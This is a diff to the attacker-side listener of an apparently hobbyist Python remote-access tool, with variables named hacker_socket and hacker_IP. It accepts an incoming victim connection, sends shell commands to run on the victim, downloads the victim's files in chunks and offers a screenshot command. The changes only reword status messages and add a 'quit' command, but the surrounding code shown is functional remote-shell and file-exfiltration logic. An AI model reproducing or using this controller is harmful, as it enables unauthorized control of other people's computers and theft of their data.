@@ -5,7 +5,7 @@ eof_identifier = "<END_OF_FILE_IDENTIFIER>"
 CHUNK_SIZE = 2048
 
 def receive_file():
-    print("Receiving file")
+    print("Receiving file ...")
 
 
 if __name__ == "__main__":
@@ -15,14 +15,14 @@ if __name__ == "__main__":
     socket_address = (hacker_IP, hacker_port)
     hacker_socket.bind(socket_address)
     hacker_socket.listen(5)
-    print("listening for incoming connection requests")
+    print("Listening for incoming connection requests ...")
     hacker_socket, client_address = hacker_socket.accept()
-    print("connection established with ", client_address)
+    print("Connection established with ", client_address)
     try:
         while True:
-            command = input("Enter the command ")
+            command = input("Enter the command: ")
             hacker_socket.send(command.encode())
-            if command == "stop":
+            if (command == "stop") or (command == "quit"):
 
                 hacker_socket.close()
                 break
@@ -42,7 +42,7 @@ if __name__ == "__main__":
                     file_name = command.strip("download ")
 
                     with open(file_name, "wb") as file:
-                        print("Downloading file")
+                        print("Downloading file ...")
                         while True:
                             chunk = hacker_socket.recv(CHUNK_SIZE)
 
@@ -51,13 +51,13 @@ if __name__ == "__main__":
                                 file.write(chunk)
                                 break
                             file.write(chunk)
-                    print("Successfully downloaded, ", file_name)
+                    print("File ", file_name, " successfully downloaded.")
 
                 else:
                     print("File doesn't exist")
                     continue
             elif command == "screenshot":
-                print("taking screenshot")
+                print("Taking screenshot ...")
             else:
                 full_command_result = b''
                 while True:
@@ -71,5 +71,5 @@ if __name__ == "__main__":
                     full_command_result +=chunk
                 print(full_command_result.decode())
     except Exception:
-        print("Exception occured")
+        print("Exception occured.")
         hacker_socket.close()
